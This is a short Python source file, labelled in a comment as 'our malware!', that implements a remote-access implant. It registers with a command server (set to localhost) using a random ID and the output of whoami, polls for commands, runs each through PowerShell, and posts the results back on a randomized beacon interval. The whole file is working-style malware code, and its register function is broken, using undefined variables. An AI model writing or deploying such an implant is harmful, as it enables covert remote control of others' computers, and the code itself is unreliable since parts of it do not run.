import requests 
import subprocess
import time
import random
import os 

# our malware!
server = "http://127.0.0.1:5000"
task_path = "/tasks"
response_path = "/response"
reigster_path = "/register"

def fetch_tasks():
    r = requests.get(f"{server}{task_path}")
    if r.status_code == 200:
        return r.text.split("\n")
    return []




def run_tasks(cmds):
    output = ""
    print(cmds)
    cmds = [i for i in cmds if i]
    for cmd in cmds:
        print("CMD:",cmd)
        result = subprocess.Popen(f"powershell.exe /c {cmd}", stdout=subprocess.PIPE)
        output += result.stdout.read().decode() + "\n"
    return output 
    
def send_response(results):
    r = requests.post(f"{server}{response_path}", data=results)


def register():
    implant_id = os.urandom(10).hex()
    whoami = subprocess.Popen("whoami", stdout=subprocess.PIPE)
    output += result.stdout.read().decode()
    r = requests.post(f"{server}{reigster_path}", json={"implant_id":implant_id, "whoami":whoami})
    if r.status_code ==200:
        if r.text == "OK":
            print("reigstered!")
            return True 
        
    return False 

def main():
    while not register():
        time.sleep(10)
    while True:
        time.sleep(1 + random.randint(1,5))
        try:
            cmds = fetch_tasks()
        except Exception as e:
            print(Exception, e)
            continue
        if cmds:
            results = run_tasks(cmds)
            send_response(results)


if __name__ == "__main__":
    main()